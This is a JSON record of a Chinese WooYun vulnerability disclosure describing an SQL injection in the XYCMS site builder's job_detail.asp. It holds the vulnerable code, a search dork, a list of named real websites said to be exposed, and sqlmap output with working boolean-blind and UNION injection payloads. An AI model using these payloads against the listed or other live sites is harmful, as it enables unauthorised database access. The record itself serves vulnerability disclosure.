{"id": 41358, "wybug_id": "wooyun-2014-089110", "wybug_title": "XYCMS建站系统SQL注入#2", "wybug_corp": "XYCMS", "wybug_author": "路人甲", "wybug_date": "2014-12-31 14:27", "wybug_open_date": "2015-03-31 14:28", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射漏洞利用技巧", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-31：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-31：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： XYCMS建站系统SQL注入#2 详细说明：  同第一个XYCMS建站系统SQL注入#1这里提交的在wooyun没有提交过！这里提交不重复，证明：\n\n除了：fwxm_detail.asp，news.asp，team_detail.asp这些外。。。job_detail.asp未对id进行任何过滤就直接带入数据库查询\nid=request.QueryString(\"id\")set rs=server.createobject(\"adodb.recordset\") exec=\"select * from zpxx where id=\"& idrs.open exec,conn,1,1if rs.eof thenresponse.Write \"<div style=\"\"padding:10px\"\">没有相关信息！</a>\"response.End()end if\n\n\n   漏洞证明：  搜索特征：inurl:job_detail.asp?id=实例：http://www.qdzhihui.cn/job_detail.asp?id=22http://www.jmofcole.com/job_detail.asp?id=3http://www.cdmalc.com/job_detail.asp?id=2http://www.czjt.com/job_detail.asp?id=386http://www.shenzhouintl.com/cn_jt/job_detail.asp?id=26http://www.njjldg.com/job_detail.asp?id=2http://www.xmwx.org.cn/job_detail.asp?id=45http://zqrc.com.cn/job_detail.asp?id=29763http://www.zn-test.cn/job_detail.asp?id=2http://www.qdzhihui.cn/job_detail.asp?id=23...\n\n\nGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 22 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=22 AND 3795=3795    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: id=-8961 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CHR(58)&CHR(104)&CHR(118)&CHR(121)&CHR(58)&CHR(106)&CHR(85)&CHR(73)&CHR(88)&CHR(100)&CHR(68)&CHR(68)&CHR(110)&CHR(69)&CHR(108)&CHR(58)&CHR(113)&CHR(107)&CHR(104)&CHR(58),NULL,NULL FROM MSysAccessObjects%00---\n   修复方案：  加入防注入代码，对id获取的地方进行过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}